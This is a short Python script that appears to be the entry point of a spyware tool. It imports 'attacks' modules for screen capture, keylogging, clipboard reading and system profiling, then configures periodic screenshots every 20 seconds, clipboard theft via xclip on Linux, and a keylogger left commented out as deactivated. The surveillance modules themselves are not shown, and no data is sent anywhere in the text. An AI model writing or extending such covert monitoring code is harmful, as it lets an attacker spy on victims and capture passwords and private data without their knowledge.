from pathlib import Path
from tools import _path_joiner

from modules.attacks.capture_screen import CaptureScreen
from modules.attacks.keylogger import KeyLogger
from modules.attacks.clipboard import ClipBoard
from modules.attacks.sys_info import SystemInfo

from rich import print

# Path
BASE_PATH = Path(__file__).parent
DATA_PATH = _path_joiner(BASE_PATH, 'data')
KEY_LOG_PATH = _path_joiner(DATA_PATH, 'keylog')
SCREEN_CAPTURE_PATH = _path_joiner(DATA_PATH, 'screen_captures')

# System Info 
SYS_INFO = SystemInfo.get()
print(SYS_INFO)


_screen_capture = CaptureScreen(
    file_path=SCREEN_CAPTURE_PATH,
    period=20,
)


_clipboard_attack = ClipBoard(
    os=SYS_INFO.get('os_name'),
    commands={
        "Linux": ['xclip', '-selection', 'clipboard', '-o'],
        "Windows": [],
        "Mac": []
    }
)

## Deactivated
# _keylogger = KeyLogger(
#     log_path=_path_joiner(DATA_PATH, 'keylog.txt')
# )







